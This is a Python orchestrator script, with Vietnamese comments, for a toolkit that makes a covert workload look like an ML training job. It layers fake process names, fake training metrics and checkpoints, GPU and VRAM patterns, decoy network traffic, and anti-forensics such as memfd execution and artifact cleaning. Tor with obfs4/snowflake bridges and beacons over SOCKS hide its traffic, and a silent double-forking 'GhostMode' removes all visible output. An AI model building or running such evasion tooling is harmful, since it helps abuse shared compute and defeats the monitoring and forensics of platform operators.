"""
orchestrator.py — Tổng hợp tất cả layers, tạo training-like environment
"""
import os
import sys
import time
import random
import signal
import threading
from pathlib import Path
from typing import Optional, Tuple

# Add layers to path
sys.path.insert(0, str(Path(__file__).parent))

# ═══════════════════════════════════════════════════════════════
# IMPORT LAYERS
# ═══════════════════════════════════════════════════════════════

from disguise import (
    setup_process_identity,
    setup_all_disguise,
    DiskArtifacts,
    FakeTrainingThreads,
    MemoryDisguise,
    set_process_name,
    set_thread_name,
)

from gpu_pattern import (
    GPUPattern,
    GPUController,
    FakeGPUMetrics,
)

from network_disguise import (
    DNSDisguise,
    ConnectionRhythm,
    ProtocolDisguise,
    TrafficPadding,
    DoHResolver,
    setup_network_disguise,
    FAKE_ML_ENDPOINTS,
)

from timing_disguise import (
    StepTiming,
    EpochSchedule,
    IdlePattern,
    create_timing_suite,
)

from syscall_disguise import (
    FakeSyscallTraffic,
    SyscallJitter,
    start_syscall_disguise,
)

from anti_forensics import (
    MemfdRunner,
    ArtifactCleaner,
    EnvSanitizer,
    start_anti_forensics,
)

from process_tree_disguise import (
    ProcessTreeDisguise,
    CgroupDisguise,
    start_process_tree_disguise,
)

from gpu_resident import (
    VRAMResident,
    CudaCtypes,
    gpu_total_mb,
    gpu_used_mb,
)

from tor_hardened import (
    start_tor_hardened,
    CircuitRefresher,
    fetch_builtin_bridges,
)

from telemetry_beacon import (
    TelemetryBeacon,
    start_beacons,
    TorHttpClient,
)


# ═══════════════════════════════════════════════════════════════
# TRAINING SIMULATOR — Heartbeat + Coordination
# ═══════════════════════════════════════════════════════════════

class TrainingSimulator:
    """
    Tổng hợp tất cả layers → 1 training-like environment.
    
    Coordination:
    - Heartbeat: Fake metrics output
    - GPU pattern: Utilization cycle
    - Disk: Periodic artifacts
    - Threads: DataLoader, checkpoint, logger
    - Network: Fake DNS, rhythm
    - Timing: Step/epoch schedule
    - Syscall: Fake I/O traffic
    - Forensics: Cleanup + env sanitize
    - Process tree: Fake workers/services
    """
    
    def __init__(self, log_output: bool = True, num_workers: int = 4):
        self.log_output = log_output
        self.num_workers = num_workers
        self._running = False
        self._step = 0
        
        # Components (được init trong setup())
        self.disk: Optional[DiskArtifacts] = None
        self.threads: Optional[FakeTrainingThreads] = None
        self.memory: Optional[MemoryDisguise] = None
        self.gpu_pattern: Optional[GPUPattern] = None
        self.network: Optional[dict] = None
        self.timing: Optional[dict] = None
        self.syscall: Optional[FakeSyscallTraffic] = None
        self.forensics: Optional[dict] = None
        self.process_tree: Optional[ProcessTreeDisguise] = None
        self.vram: Optional[VRAMResident] = None
        self.beacon: Optional[TelemetryBeacon] = None
        self.tor_proc = None
        self.circuit_refresher: Optional[CircuitRefresher] = None
        
        # Metrics
        self._fake_metrics = FakeGPUMetrics()
    
    def setup(self, gpu_id: int = 0, silent: bool = False,
              socks: Tuple[str, int] = ("127.0.0.1", 9050),
              vram_target_frac: float = 0.88,
              use_tor_hardened: bool = False,
              use_beacons: bool = True):
        """
        Setup tất cả layers.
        
        Args:
            gpu_id: GPU index
            silent: Nếu True, redirect stdout/stderr → /dev/null
        """
        if not silent:
            print("[orchestrator] Setting up disguise layers...", flush=True)
        
        # Layer 1: Process identity (đầu tiên — quan trọng nhất)
        if not silent:
            print("[orchestrator]  Layer 1: Process identity...", flush=True)
        # Note: setup_process_identity có double-fork + redirect
        # → Chỉ gọi nếu muốn detach hoàn toàn
        # Trong notebook: skip double-fork, chỉ set name + env
        set_process_name("python3.12")
        
        # Layer 2-4: Disk, Memory, Threads
        if not silent:
            print("[orchestrator]  Layer 2-4: Disk/Memory/Threads...", flush=True)
        self.disk, self.threads, self.memory = setup_all_disguise(
            num_dataloader_workers=self.num_workers
        )
        
        # Layer 5: GPU pattern
        if not silent:
            print("[orchestrator]  Layer 5: GPU pattern...", flush=True)
        self.gpu_pattern = GPUPattern(gpu_id=gpu_id)
        self.gpu_pattern.start()
        
        # Layer 6: Network disguise
        if not silent:
            print("[orchestrator]  Layer 6: Network disguise...", flush=True)
        self.network = setup_network_disguise()
        
        # Layer 7: Timing schedule
        if not silent:
            print("[orchestrator]  Layer 7: Timing schedule...", flush=True)
        self.timing = create_timing_suite()
        # Schedule: eval/decay/early-stop → disk artifacts
        self.timing["schedule"].on_epoch_boundary = lambda c: (
            self.disk and self.disk.append_training_log()
        )
        self.timing["schedule"].on_lr_decay = lambda c: (
            self.gpu_pattern and self.gpu_pattern.gpu.available and
            self.gpu_pattern.gpu.set_power_limit(random.randint(80, 120))
        )
        self.timing["schedule"].start()
        
        # Layer 8: Syscall traffic
        if not silent:
            print("[orchestrator]  Layer 8: Syscall traffic...", flush=True)
        self.syscall = start_syscall_disguise()
        
        # Layer 9: Anti-forensics
        if not silent:
            print("[orchestrator]  Layer 9: Anti-forensics...", flush=True)
        self.forensics = start_anti_forensics()
        
        # Layer 10: Process tree + cgroup
        if not silent:
            print("[orchestrator]  Layer 10: Process tree...", flush=True)
        self.process_tree = start_process_tree_disguise(
            num_workers=self.num_workers
        )
        
        # Layer 11: VRAM resident (chiếm VRAM thật stable)
        if not silent:
            print("[orchestrator]  Layer 11: VRAM resident...", flush=True)
        self.vram = VRAMResident(gpu_id=gpu_id, target_frac=vram_target_frac)
        vram_info = self.vram.start()
        if not silent and not vram_info.get("ok"):
            print(f"[orchestrator]    VRAM skip: {vram_info.get('reason')}",
                  flush=True)
        
        # Layer 12: Tor hardened (obfs4/snowflake) — nếu được yêu cầu
        if use_tor_hardened:
            if not silent:
                print("[orchestrator]  Layer 12: Tor hardened...", flush=True)
            self.tor_proc = start_tor_hardened(socks=socks,
                                               log=(print if not silent else (lambda m: None)))
            if self.tor_proc:
                self.circuit_refresher = CircuitRefresher()
                # ControlPort cần mở trong torrc — best effort
                # self.circuit_refresher.start()
        
        # Layer 13: Telemetry beacons (fake ML traffic qua SOCKS)
        if use_beacons:
            if not silent:
                print("[orchestrator]  Layer 13: Telemetry beacons...", flush=True)
            self.beacon = start_beacons(socks=socks, enabled=True)
        
        if not silent:
            print("[orchestrator] All layers active!", flush=True)
    
    def heartbeat_loop(self, interval: float = 1.0):
        """
        Heartbeat — in fake training metrics mỗi interval.
        Dùng StepTiming để jitter nhịp.
        """
        self._running = True
        step_timing = self.timing["step"] if self.timing else None
        
        while self._running:
            try:
                self._step += 1
                metrics = self._fake_metrics.get_fake_metrics(self._step)
                # Dùng VRAM THẬT nếu resident đang chạy (chuẩn chỉnh hơn)
                if self.vram and self.vram.running:
                    real_used = gpu_used_mb(self.vram.gpu_id)
                    if real_used > 0:
                        metrics["memory_used_mb"] = real_used
                line = self._fake_metrics.format_metrics_line(self._step, metrics)
                
                if self.log_output:
                    print(line, flush=True)
                
                # Disk artifacts mỗi N steps
                if self._step % 100 == 0 and self.disk:
                    self.disk.fake_artifacts_cycle()
                
                # Delay theo StepTiming (jitter + stall + checkpoint spike)
                if step_timing:
                    delay = step_timing.next_step_delay()
                else:
                    delay = interval + random.gauss(0, interval * 0.1)
                time.sleep(delay)
                
            except Exception:
                time.sleep(interval)
    
    def start_heartbeat(self, interval: float = 1.0):
        """Start heartbeat trong thread."""
        t = threading.Thread(
            target=self.heartbeat_loop,
            args=(interval,),
            daemon=True
        )
        t.start()
        return t
    
    def coordination_loop(self):
        """
        Coordination loop — sync các components.
        Chạy trong background thread.
        """
        epoch = 0
        
        while self._running:
            # Epoch boundaries
            epoch_duration = random.uniform(300, 1800)  # 5-30 phút
            time.sleep(epoch_duration)
            
            if not self._running:
                break
            
            epoch += 1
            
            # Fake "validation" — GPU low load
            if self.gpu_pattern and self.gpu_pattern.gpu.available:
                self.gpu_pattern.gpu.set_power_limit(random.randint(80, 120))
                time.sleep(random.uniform(60, 180))
            
            # Fake "checkpoint"
            if self.disk:
                self.disk.create_checkpoint(self.disk.epoch)
                self.disk.epoch += 1
            
            # Fake "save log"
            if self.disk:
                self.disk.append_training_log()
            
            # Occasionally: "early stop check" (longer pause)
            if random.random() < 0.05:
                if self.gpu_pattern and self.gpu_pattern.gpu.available:
                    self.gpu_pattern.gpu.set_power_limit(40)
                time.sleep(random.uniform(60, 300))
    
    def start_coordination(self):
        """Start coordination loop."""
        t = threading.Thread(target=self.coordination_loop, daemon=True)
        t.start()
        return t
    
    def run(self, duration: Optional[float] = None):
        """
        Chạy simulator — blocks cho tới khi stop() hoặc duration hết.
        
        Args:
            duration: Seconds (None = run forever)
        """
        self.setup()
        
        # Start components
        self.start_heartbeat(interval=1.0)
        self.start_coordination()
        
        if self.log_output:
            print(f"\n[orchestrator] Training simulator running...", flush=True)
            print(f"[orchestrator] Press Ctrl+C to stop\n", flush=True)
        
        try:
            if duration:
                time.sleep(duration)
            else:
                while self._running:
                    time.sleep(1)
        except KeyboardInterrupt:
            pass
        finally:
            self.stop()
    
    def stop(self):
        """Stop tất cả components."""
        self._running = False
        
        if self.threads:
            self.threads.stop()
        
        if self.gpu_pattern:
            self.gpu_pattern.stop()
        
        if self.network and "dns" in self.network:
            self.network["dns"].stop()
        
        if self.timing:
            if "schedule" in self.timing:
                self.timing["schedule"].stop()
        
        if self.syscall:
            self.syscall.stop()
            self.syscall.cleanup()
        
        if self.forensics and "cleaner" in self.forensics:
            self.forensics["cleaner"].stop()
        
        if self.process_tree:
            self.process_tree.stop()
        
        if self.vram:
            self.vram.stop()
        
        if self.beacon:
            self.beacon.stop()
        
        if self.circuit_refresher:
            self.circuit_refresher.stop()
        
        if self.tor_proc and hasattr(self.tor_proc, "terminate"):
            try:
                self.tor_proc.terminate()
            except Exception:
                pass
        
        if self.log_output:
            print("\n[orchestrator] Stopped.", flush=True)
    
    def status(self) -> dict:
        """Trả về status của tất cả components."""
        st = {
            "step": self._step,
            "running": self._running,
            "gpu_available": self.gpu_pattern.gpu.available if self.gpu_pattern else False,
            "disk_base": str(self.disk.base) if self.disk else None,
            "network_dns": self.network is not None,
            "timing_step": self.timing["step"].step if self.timing else 0,
            "syscall_active": self.syscall is not None,
            "forensics_active": self.forensics is not None,
            "proc_tree": self.process_tree.status() if self.process_tree else None,
            "tor_hardened": self.tor_proc is not None,
            "beacon": self.beacon.stats() if self.beacon else None,
        }
        if self.vram:
            st["vram"] = self.vram.stats()
        return st


# ═══════════════════════════════════════════════════════════════
# GHOST MODE — Silent + Full disguise
# ═══════════════════════════════════════════════════════════════

class GhostMode(TrainingSimulator):
    """
    Ghost mode: Full disguise + silent operation.
    Không log, không output, không visible.
    """
    
    def __init__(self, **kwargs):
        kwargs['log_output'] = False  # Silent
        super().__init__(**kwargs)
    
    def setup(self, **kwargs):
        """Setup với full process disguise."""
        kwargs['silent'] = True
        
        # Full process identity (double-fork + redirect)
        setup_process_identity()
        
        # Setup layers
        super().setup(**kwargs)
    
    def run_silent(self, duration: Optional[float] = None):
        """
        Chạy ghost mode — hoàn toàn im lặng.
        """
        self.setup(silent=True)
        
        # Redirect output sau khi setup (để debug nếu cần)
        # super().setup đã silent, nhưng heartbeat vẫn in
        # → Override: tắt log
        self.log_output = False
        
        # Start components
        self.start_heartbeat(interval=2.0)  # Ít hơn để giảm CPU
        self.start_coordination()
        
        # Block
        try:
            if duration:
                time.sleep(duration)
            else:
                while self._running:
                    time.sleep(10)  # Sleep dài hơn
        except KeyboardInterrupt:
            pass
        finally:
            self.stop()


# ═══════════════════════════════════════════════════════════════
# CONVENIENCE FUNCTIONS
# ═══════════════════════════════════════════════════════════════

def create_training_environment(mode: str = "normal", **kwargs) -> TrainingSimulator:
    """
    Tạo training environment.
    
    Modes:
    - "normal": Có log output (debug)
    - "ghost": Silent, full disguise
    
    Returns: TrainingSimulator instance
    """
    if mode == "ghost":
        return GhostMode(**kwargs)
    else:
        return TrainingSimulator(**kwargs)


def quick_setup(num_workers: int = 4, gpu_id: int = 0) -> tuple:
    """
    Quick setup — trả về (simulator, disk, gpu_pattern, network).
    Không start threads — caller tự manage.
    """
    # Process identity
    set_process_name("python3.12")
    
    # Disk/Memory/Threads
    disk, threads, memory = setup_all_disguise(num_dataloader_workers=num_workers)
    
    # GPU pattern (chưa start)
    gpu = GPUPattern(gpu_id=gpu_id)
    
    # Network
    network = setup_network_disguise()
    
    # Simulator (chưa start)
    sim = TrainingSimulator(log_output=True, num_workers=num_workers)
    sim.disk = disk
    sim.threads = threads
    sim.memory = memory
    sim.gpu_pattern = gpu
    sim.network = network
    
    return sim, disk, gpu, network
